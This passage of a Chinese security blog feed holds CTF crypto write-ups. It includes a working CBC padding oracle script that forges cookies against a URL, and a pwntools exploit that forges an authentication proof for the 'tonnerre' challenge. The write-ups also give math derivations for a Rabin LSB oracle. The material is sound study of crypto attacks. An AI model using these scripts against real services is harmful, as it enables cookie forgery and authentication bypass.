class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>本题的漏洞在于，源码中<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kv = urlparse.parse_qsl(s)</span><br><span class="line">        <span class="keyword">ret</span> = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> kv:</span><br><span class="line">            <span class="keyword">ret</span>[k] = v</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">ret</span></span><br></pre></td></tr></table></figure></p>
<p>如果解密出来的s为<code>username=xxx&amp;username=admin</code><br>那么最终得到<code>ret = {&#39;username&#39;: &#39;admin&#39;}</code></p>
<p>我们可以注册<code>username=a</code>用户，得到<code>SHA1(MAC + username=a)</code>的hash值，利用Length Extension Attack我们可以算出<code>SHA1(MAC + username=a + pad + &amp;username=admin)</code> 的hash值，然后我们再利用Padding Oracle Attack，再构造出<code>username=a+pad+&amp;username=admin</code>密文，根据本题的具体需求，稍微改了下Padding Oracle Attack的脚本</p>
<figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> <span class="type">OptionParser</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">class <span class="type">POAttack</span>():</span><br><span class="line">    <span class="string">"""</span><br><span class="line">    以GGCTF的一题为例写的Padding Oracle Attack</span><br><span class="line">    By Hcamael</span><br><span class="line">    """</span></span><br><span class="line">    def __init__(self, options):</span><br><span class="line">        self.url = options.url</span><br><span class="line">        self.length = options.length</span><br><span class="line">        cookie = options.cookie.split(<span class="string">"="</span>)</span><br><span class="line">        assert len(cookie) == <span class="number">2</span></span><br><span class="line">        self.c_name = cookie[<span class="number">0</span>]</span><br><span class="line">        c = cookie[<span class="number">1</span>].decode('hex')</span><br><span class="line">        <span class="keyword">if</span> len(c) % self.length != <span class="number">0</span> <span class="keyword">or</span> len(c) == self.length:</span><br><span class="line">            <span class="keyword">raise</span> <span class="string">"cookie error!"</span></span><br><span class="line">        self.sign = c[-self.length:].encode('hex')</span><br><span class="line">        self.<span class="literal">result</span> = self.sign</span><br><span class="line">        self.unenc = <span class="string">""</span></span><br><span class="line">        <span class="keyword">if</span> options.plain:</span><br><span class="line">            self.plain = options.plain</span><br><span class="line">            self.pad_plain = (self.length - len(self.plain) % self.length)</span><br><span class="line">            self.pad_iv = c[-self.length*<span class="number">2</span>: -self.length]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.pad_plain = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    def attack(self, msg):</span><br><span class="line">        self.a_str = msg</span><br><span class="line">        pad = (self.length - len(self.a_str) % self.length)</span><br><span class="line">        self.a_str += chr(pad) * pad</span><br><span class="line">        assert len(self.a_str) % self.length == <span class="number">0</span></span><br><span class="line">        self.l_str = list(struct.unpack(<span class="string">"16s"</span>*(len(self.a_str)/self.length), self.a_str))</span><br><span class="line"></span><br><span class="line">        self.iv = <span class="string">"\x00"</span> * self.length</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(len(self.l_str)):</span><br><span class="line">            print <span class="string">"+===================================================+"</span></span><br><span class="line">            print <span class="string">"plaintext: %s"</span> % self.l_str[-x-<span class="number">1</span>].encode('hex')</span><br><span class="line">            <span class="literal">result</span> = self.padding()</span><br><span class="line">            self.unenc = <span class="literal">result</span> + self.unenc</span><br><span class="line">            assert len(<span class="literal">result</span>) == len(self.l_str[-x-<span class="number">1</span>]) == self.length</span><br><span class="line">            tmp = <span class="string">""</span></span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> xrange(len(<span class="literal">result</span>)):</span><br><span class="line">                tmp += chr(ord(<span class="literal">result</span>[y])^ord(self.l_str[-x-<span class="number">1</span>][y]))</span><br><span class="line">            self.sign = tmp.encode('hex')</span><br><span class="line">            self.<span class="literal">result</span> = self.sign + self.<span class="literal">result</span></span><br><span class="line">        <span class="keyword">return</span> (self.<span class="literal">result</span>, self.unenc.encode(<span class="string">"hex"</span>))</span><br><span class="line"></span><br><span class="line">    def padding(self):</span><br><span class="line">        tmp_iv = list(self.iv)</span><br><span class="line">        <span class="literal">result</span> = list(<span class="string">"\x00"</span> * self.length)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.pad_plain:</span><br><span class="line">            n = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            n = self.pad_plain</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(n):</span><br><span class="line">                <span class="literal">result</span>[-i-<span class="number">1</span>] = chr(n ^ ord(self.pad_iv[-i-<span class="number">1</span>]))</span><br><span class="line">            self.pad_plain = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(n, self.length):</span><br><span class="line">            <span class="keyword">if</span> n != x:</span><br><span class="line">                <span class="keyword">raise</span> <span class="string">"Padding Error!"</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(x):</span><br><span class="line">                tmp_iv[-i-<span class="number">1</span>] = chr((x+<span class="number">1</span>) ^ ord(<span class="literal">result</span>[-i-<span class="number">1</span>]))</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">                tmp_iv[-x-<span class="number">1</span>] = chr(y)</span><br><span class="line">                tmp = <span class="string">""</span>.join(tmp_iv).encode('hex')</span><br><span class="line">                cookie = &#123;self.c_name: <span class="string">"d379b40e4da82e7d080d689d6fed5942671dde6f."</span> + tmp + self.sign&#125;</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    req = requests.get(self.url, cookies=cookie, verify=<span class="type">False</span>, allow_redirects=<span class="type">False</span>)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    print <span class="literal">result</span></span><br><span class="line">                    print self.<span class="literal">result</span></span><br><span class="line">                    exit()</span><br><span class="line">                <span class="keyword">if</span> req.status_code != <span class="number">500</span>:</span><br><span class="line">                    <span class="literal">result</span>[-x-<span class="number">1</span>] = chr(y^(x+<span class="number">1</span>))</span><br><span class="line">                    print <span class="string">"iv xor plaintext = %s"</span> % <span class="string">""</span>.join(<span class="literal">result</span>[-x-<span class="number">1</span>:]).encode('hex')</span><br><span class="line">                    n += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>.join(<span class="literal">result</span>)</span><br><span class="line"></span><br><span class="line">def add_parse():</span><br><span class="line">    parser = <span class="type">OptionParser</span>()</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">"--url"</span>,</span><br><span class="line">        dest=<span class="string">"url"</span>,</span><br><span class="line">        help=<span class="string">"Please input the url"</span>)</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">"--l"</span>,</span><br><span class="line">        dest=<span class="string">"length"</span>,</span><br><span class="line">        <span class="keyword">type</span>=<span class="string">"int"</span>,</span><br><span class="line">        help=<span class="string">"Please input the iv's bytes length"</span>)</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">"--cookie"</span>,</span><br><span class="line">        dest=<span class="string">"cookie"</span>,</span><br><span class="line">        help=<span class="string">"Please input the url's cookie"</span>)</span><br><span class="line">    <span class="comment"># parser.add_option(</span></span><br><span class="line">    <span class="comment">#   "--s",</span></span><br><span class="line">    <span class="comment">#   dest="a_str",</span></span><br><span class="line">    <span class="comment">#   help="Please input you want to construct a string")</span></span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">"--p"</span>,</span><br><span class="line">        dest=<span class="string">"plain"</span>,</span><br><span class="line">        help=<span class="string">"Please input if you know cookie's pliantext"</span>)</span><br><span class="line">    <span class="keyword">return</span> parser</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = add_parse()</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (options.url <span class="keyword">and</span> options.length <span class="keyword">and</span> options.cookie):</span><br><span class="line">        parser.parse_args(['cbc-padding-oracle-attack.py', '-h'])</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    options.a_str = <span class="string">"username=a\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x50&amp;username=admin"</span></span><br><span class="line">    cbca = <span class="type">POAttack</span>(options)</span><br><span class="line">    r, s = cbca.attack(options.a_str)</span><br><span class="line">    print <span class="string">"+-------------------+"</span></span><br><span class="line">    print <span class="string">"|       Result     |"</span></span><br><span class="line">    print <span class="string">"+--------------------+"</span></span><br><span class="line">    print <span class="string">"Your want string's cookie: "</span> + r</span><br><span class="line">    print <span class="string">"AES decrypt result: "</span> + s</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == '__main__':</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<p>研究了GGCTF中的两题密码学，用到了SHA1 Length Extension Attack &amp;&amp; CBC Padding Oracle Attack<br>]]>
    
    </summary>
    
      <category term="CBC Padding Oracle Attack" scheme="http://0x48.pw/tags/CBC-Padding-Oracle-Attack/"/>
    
      <category term="Crypto" scheme="http://0x48.pw/tags/Crypto/"/>
    
      <category term="SHA1 Length Extension Attack" scheme="http://0x48.pw/tags/SHA1-Length-Extension-Attack/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[How old are Crypto?]]></title>
    <link href="http://0x48.pw/2016/04/17/0x19/"/>
    <id>http://0x48.pw/2016/04/17/0x19/</id>
    <published>2016-04-17T14:01:46.000Z</published>
    <updated>2016-04-19T08:09:48.051Z</updated>
    <content type="html"><![CDATA[<p>这周的PCTF撸了两道Crypto, 果然我只是民科….(ノಠ益ಠ)ノ彡┻━┻</p>
<a id="more"></a>
<h1 id="tonnerre">tonnerre</h1><blockquote>
<p>Describe: We were pretty sure the service at tonnerre.pwning.xxx:8561 <a href="https://github.com/Hcamael/ctf-library/blob/master/tonnerre/public_server_ea2e768e20e89fb1aafbbc547cdb4636.py" target="_blank" rel="external">source</a> was totally secure. But then we came across this website and now we’re having second thoughts… We think they store the service users in the same database?</p>
</blockquote>
<p>给了一个服务，和代码，然后一个使用了相同数据库的网站.</p>
<p>网站有SQLi, 很简单，直接用sqlmap跑就行了得到:<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">salt,user,verifier</span><br><span class="line">D14058efb3f49bd1f1c68de<span class="number">447393855</span>e<span class="number">004103d432</span>fa<span class="number">61849f0e52</span><span class="number">62d0d9e86</span>63c0dfcb877d40ea6de6b78efd064bdd<span class="number">02f6555a90</span>d<span class="number">92a8a5c76</span>b<span class="number">28b9a785</span>fd861348af<span class="number">8a7014f44</span>97a5de<span class="number">5d0d703</span>a24ff9ec9b5c1ff<span class="number">8051e3825</span>a0fc<span class="number">8a433296</span>d31cf0bd<span class="number">5d21b09c8</span>cd<span class="number">7e658f227</span><span class="number">2744b4d2</span>fb63d4bccff<span class="number">8f921932</span>a<span class="number">2e81813</span>,get_flag,ebedd14b5bf7d5fd88eebb057af<span class="number">43803b6f88</span>e42f7ce2a4445fdbbe69a9ad<span class="number">7e7a76b7</span>df4a4e79cefd61ea<span class="number">0c4f426</span>c0261acf5becb5f79cdf<span class="number">916d68466</span><span class="number">7b6b0940</span>b4ac<span class="number">2f88559064</span>8fbf<span class="number">2d107707</span>acb<span class="number">38382a95</span>bea9a89fb<span class="number">943a5c1</span>ef<span class="number">6e6d06408</span>4f8225eb<span class="number">323f668</span>e2c3174ab7b1dbfce<span class="number">831507b33</span>e<span class="number">413b56a41</span><span class="number">528b1c85</span>0e59</span><br><span class="line"># salt 并没发现有啥用</span><br></pre></td></tr></table></figure></p>
<p>然后这段代码拿去sage跑出x<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">168875487862</span><span class="number">8127181038140</span><span class="number">228439772354</span><span class="number">2063724360105</span><span class="number">77805950444</span><span class="number">00667893046</span><span class="number">2691404211237</span><span class="number">668174205460</span><span class="number">87076238158</span><span class="number">376401194506</span><span class="number">1026673503222</span><span class="number">81734359552</span><span class="number">897112157094</span><span class="number">231977097740</span><span class="number">55479382470</span><span class="number">1009850244904</span><span class="number">160300597684</span><span class="number">567190792283</span><span class="number">98429974360</span><span class="number">42135330366</span><span class="number">817941147204</span><span class="number">174372245096</span><span class="number">075364137934</span><span class="number">2541163641156</span><span class="number">332130344474</span><span class="number">0798477587</span></span><br><span class="line">g = <span class="number">979776662131</span><span class="number">46848738957</span><span class="number">00802803279</span><span class="number">209044463565</span><span class="number">2437319224668</span><span class="number">31101232640</span><span class="number">732633100491</span><span class="number">2288236176177</span><span class="number">644193675051</span><span class="number">79450247842</span><span class="number">28395564900</span><span class="number">74541491700</span><span class="number">85442756585</span><span class="number">55487162475</span><span class="number">226657175384</span><span class="number">125050857269</span><span class="number">078999249505</span>4848</span><br><span class="line">v = <span class="number">165674960298</span><span class="number">67731536964</span><span class="number">256186788349</span><span class="number">609162476929</span><span class="number">2792204074150</span><span class="number">33709261496</span><span class="number">4752287803122</span><span class="number">62187696335</span><span class="number">971578097190</span><span class="number">00935789628</span><span class="number">50132496591</span><span class="number">1922951315106</span><span class="number">249172046701</span><span class="number">92364009271</span><span class="number">72308944483</span><span class="number">95486065332</span><span class="number">68832368676</span><span class="number">26840576437</span><span class="number">79880053238</span><span class="number">097343214701</span><span class="number">84299186127</span><span class="number">132537376393</span><span class="number">324213965008</span><span class="number">02548756979</span><span class="number">962283146670</span><span class="number">144465326306</span><span class="number">8925529</span></span><br><span class="line"><span class="keyword">A</span> = g ** 2 % N</span><br><span class="line">(aa, bb, cc) = xgcd(v/<span class="keyword">A</span>, N)</span><br><span class="line">x = (bb * <span class="keyword">A</span>) mod N</span><br></pre></td></tr></table></figure></p>
<p>python版:<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import invert</span><br><span class="line">N = <span class="number">168875487862</span><span class="number">8127181038140</span><span class="number">228439772354</span><span class="number">2063724360105</span><span class="number">77805950444</span><span class="number">00667893046</span><span class="number">2691404211237</span><span class="number">668174205460</span><span class="number">87076238158</span><span class="number">376401194506</span><span class="number">1026673503222</span><span class="number">81734359552</span><span class="number">897112157094</span><span class="number">231977097740</span><span class="number">55479382470</span><span class="number">1009850244904</span><span class="number">160300597684</span><span class="number">567190792283</span><span class="number">98429974360</span><span class="number">42135330366</span><span class="number">817941147204</span><span class="number">174372245096</span><span class="number">075364137934</span><span class="number">2541163641156</span><span class="number">332130344474</span><span class="number">0798477587</span></span><br><span class="line">g = <span class="number">979776662131</span><span class="number">46848738957</span><span class="number">00802803279</span><span class="number">209044463565</span><span class="number">2437319224668</span><span class="number">31101232640</span><span class="number">732633100491</span><span class="number">2288236176177</span><span class="number">644193675051</span><span class="number">79450247842</span><span class="number">28395564900</span><span class="number">74541491700</span><span class="number">85442756585</span><span class="number">55487162475</span><span class="number">226657175384</span><span class="number">125050857269</span><span class="number">078999249505</span>4848</span><br><span class="line">v = <span class="number">165674960298</span><span class="number">67731536964</span><span class="number">256186788349</span><span class="number">609162476929</span><span class="number">2792204074150</span><span class="number">33709261496</span><span class="number">4752287803122</span><span class="number">62187696335</span><span class="number">971578097190</span><span class="number">00935789628</span><span class="number">50132496591</span><span class="number">1922951315106</span><span class="number">249172046701</span><span class="number">92364009271</span><span class="number">72308944483</span><span class="number">95486065332</span><span class="number">68832368676</span><span class="number">26840576437</span><span class="number">79880053238</span><span class="number">097343214701</span><span class="number">84299186127</span><span class="number">132537376393</span><span class="number">324213965008</span><span class="number">02548756979</span><span class="number">962283146670</span><span class="number">144465326306</span><span class="number">8925529</span></span><br><span class="line"><span class="keyword">A</span> = g ** 2 % N</span><br><span class="line">k = invert(<span class="keyword">A</span>, N)</span><br><span class="line">x = invert(k*v, N)</span><br></pre></td></tr></table></figure></p>
<p>payload:<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from Crypto.Hash import SHA256</span><br><span class="line"></span><br><span class="line">x = "e<span class="number">2a218006a120</span>b<span class="number">096d7836</span>bf397e7dbb<span class="number">1a8f8f6</span>cedb87c20fe<span class="number">3d4a2b99</span>fc<span class="number">9f6661777</span>bbe<span class="number">804b82e9</span>c17a0ad<span class="number">2d508b97</span><span class="number">031d146934</span><span class="number">479076a4</span>c<span class="number">11c199322e0</span>dc9724d2cdac<span class="number">24480c6</span>decae<span class="number">4e547f02</span><span class="number">0273f3a28</span><span class="number">49f9d068</span>cb<span class="number">8c774e02</span>9a747fc<span class="number">7c726a1</span>bad<span class="number">2b9f9a7</span>c<span class="number">091096002</span>c<span class="number">364f018</span>f2f1157ad<span class="number">492d42c00</span><span class="number">305d84f37</span>db7"</span><br><span class="line">v = <span class="number">165674960298</span><span class="number">67731536964</span><span class="number">256186788349</span><span class="number">609162476929</span><span class="number">2792204074150</span><span class="number">33709261496</span><span class="number">4752287803122</span><span class="number">62187696335</span><span class="number">971578097190</span><span class="number">00935789628</span><span class="number">50132496591</span><span class="number">1922951315106</span><span class="number">249172046701</span><span class="number">92364009271</span><span class="number">72308944483</span><span class="number">95486065332</span><span class="number">68832368676</span><span class="number">26840576437</span><span class="number">79880053238</span><span class="number">097343214701</span><span class="number">84299186127</span><span class="number">132537376393</span><span class="number">324213965008</span><span class="number">02548756979</span><span class="number">962283146670</span><span class="number">144465326306</span><span class="number">8925529</span></span><br><span class="line">N = <span class="number">168875487862</span><span class="number">8127181038140</span><span class="number">228439772354</span><span class="number">2063724360105</span><span class="number">77805950444</span><span class="number">00667893046</span><span class="number">2691404211237</span><span class="number">668174205460</span><span class="number">87076238158</span><span class="number">376401194506</span><span class="number">1026673503222</span><span class="number">81734359552</span><span class="number">897112157094</span><span class="number">231977097740</span><span class="number">55479382470</span><span class="number">1009850244904</span><span class="number">160300597684</span><span class="number">567190792283</span><span class="number">98429974360</span><span class="number">42135330366</span><span class="number">817941147204</span><span class="number">174372245096</span><span class="number">075364137934</span><span class="number">2541163641156</span><span class="number">332130344474</span><span class="number">0798477587</span>L</span><br><span class="line"></span><br><span class="line"># context.log_level = "debug"</span><br><span class="line">def H(P):</span><br><span class="line">    h = SHA256.new()</span><br><span class="line">    h.update(P)</span><br><span class="line">    return h.hexdigest()</span><br><span class="line"></span><br><span class="line">def tostr(<span class="keyword">A</span>):</span><br><span class="line">    return hex(<span class="keyword">A</span>)[2:].strip('L')</span><br><span class="line"></span><br><span class="line">s = remote("tonnerre.pwning.xxx", 8561)</span><br><span class="line">print s.recv()</span><br><span class="line">s.sendline("get_flag")</span><br><span class="line">s.sendline(x)</span><br><span class="line"></span><br><span class="line">salt = s.recv().strip()</span><br><span class="line">residue = s.recv().strip()</span><br><span class="line">re = int(residue, 16)</span><br><span class="line"></span><br><span class="line">session_secret = (((re - v) % N) ** 2) % N</span><br><span class="line">session_key = H(tostr(session_secret))</span><br><span class="line"></span><br><span class="line">answer = residue + session_key</span><br><span class="line">s.sendline(H(answer))</span><br><span class="line">print s.recv()</span><br></pre></td></tr></table></figure></p>
<p>这题很简单，我这菜鸡都能做出来，本来不准备写分析了，不过估计我过段时间又忘光了，还是写写分析吧.</p>
<p>从代码中已知<code>N</code>, <code>g</code>，我们可控的<code>public_client</code>设为<code>x</code>，从数据库得到<code>verifier</code>设为<code>v</code>，从代码中可得$c = (x * v)\ mod\ N$</p>
<p>每次随机一个<code>random_server</code>设为<code>r</code>, <code>public_server</code>设为<code>p_s</code>的值为$p_s = g^r\ mod\ N$</p>
<p>服务器每次会返回给我们一个<code>residue</code>设为<code>re</code>，值为$re = (p_s + v)\ mod\ N$</p>
<p>接着，$session\_secret = c^r\ mod\ N$</p>
<p>需要我们输入一个<code>proof</code>要满足下面的条件才能GetFlag.<br>$$SHA256(re+SHA256(session\_secret)) == proof$$</p>
<p>推论其实很简单, <code>session_secret</code>中只有<code>r</code>未知，但是我们知道<br>$$re = ((g^r\ mod\ N) + v)\ mod\ N$$<br>可以推出<br>$$(re - v)\ mod\ N = g^r\ mod\ N$$</p>
<p>如果我们能算出一个<code>x</code> =&gt; $(x * v)\ mod\ N = c = g$</p>
<p>这样就出来了，不过代码中却有限定条件，<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> c <span class="keyword">in</span> [<span class="keyword">N</span>-<span class="keyword">g</span>, <span class="keyword">N</span>-1, 0, 1, <span class="keyword">g</span>]:</span><br><span class="line">    req.sendall('Sorry, not permitted.\<span class="keyword">n</span>')</span><br><span class="line">    req.<span class="keyword">close</span>()</span><br><span class="line">    <span class="literal">return</span></span><br></pre></td></tr></table></figure></p>
<p>不过并没啥影响，我们仍然能继续构造一个<code>x</code>使得<br>$$(x * v)\ mod\ N = c = g^2$$<br>接着就可以推出<br>$$session\_secret = g^{2*r}\ mod\ N = (g^r\ mod\ N)^2\ mod\ N$$</p>
<p>然后现在的问题是怎么算<code>x</code>，就用上面构造的等式<br>$$(x * v)\ mod\ N = g^2$$<br>可以得出<br>$$(x * v * g^{-2})\ mod\ N = 1$$</p>
<p>这个就用扩展欧几里德算呗，不过这里有一个知识点</p>
<p>假设$A = g^2$，那么$A^{-1}$值为啥？A明显是大整数，数论是研究整数性质的学科，所以不可能有分数参与计算，所以就有了这个推论<br>$$(x * v * A^{-1})\ mod\ N = ((x * v)\ mod\ N) * (A^{-1}\ mod\ N)\ mod\ N$$<br>假设$A^{-1}\ mod\ N \equiv k$<br>这不就模逆元么，可得$A * k \equiv 1\ (mod\ N)$<br>这不就可以用扩展欧几里德算出k么，所以最后是<br>$$x * (v * k) \equiv 1\ (mod\ N)$$<br>又是通过扩展欧几里德算出<code>x</code></p>
<h1 id="rabit">rabit</h1><blockquote>
<p>Describe: Just give me a bit, the least significant’s <a href="https://github.com/Hcamael/ctf-library/tree/master/rabit" target="_blank" rel="external">enough</a>. Just a second we’re not broken, just very, very insecure. Running at rabit.pwning.xxx:7763</p>
</blockquote>
<p>已知$N = p * q$, <code>N</code>的值可以得到，<code>p和q</code>却是未知</p>
<p>我们还知道<code>c</code>的值，$c = flag^2\ mod\ N$</p>
<p>我们可控设为<code>x</code>, 当<br>$$x^{\frac{\phi(q)}{2}}\ mod\ q = 1$$<br>$$x^{\frac{\phi(p)}{2}}\ mod\ p = 1$$<br>同时成立时，<br>$$x^{\frac{\phi(N)+4}{8}}\ mod\ N = m$$<br>我们可得知<code>m</code>的奇偶性</p>
<p>然后我数学还是太菜，没撸出来，等看了WP后再来更新</p>
<h2 id="UPDATA:_4/19"><em>UPDATA: 4/19</em></h2><p>这题用的是rabin算法，使用的是 <a href="https://www.google.com/?gws_rd=ssl#q=rsa+lsb+oracle+attack" target="_blank" rel="external">rsa lsb oracle attack</a></p>
<p>首先要求N是一个Blum integer:</p>
<blockquote>
<p>$N = p * q$ =&gt; p和q是两个不相等的随机素数，且$q \equiv 3\ (mod\ 4)$和$p \equiv 3\ (mod\ 4)$同时满足</p>
</blockquote>
<p>当N为Blum Integer时，会有下面推论:<br>$$C = X^2\ mod\ N$$<br>$$X = C^{\frac{\phi(N)+4}{8}}\ mod\ N$$</p>
<p>就可以进行rabin加解密了</p>
<p>根据勒让德符号的公式，可控的<code>x</code>，要满足</p>
<p>存在一个 $a_1$ , 使得<br>$$a_{1}^{2} \equiv x\ (mod\ q)$$</p>
<p>存在一个 $a_2$ , 使得<br>$$a_{2}^{2} \equiv x\ (mod\ p)$$</p>
<p>写了个本地测试脚本:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 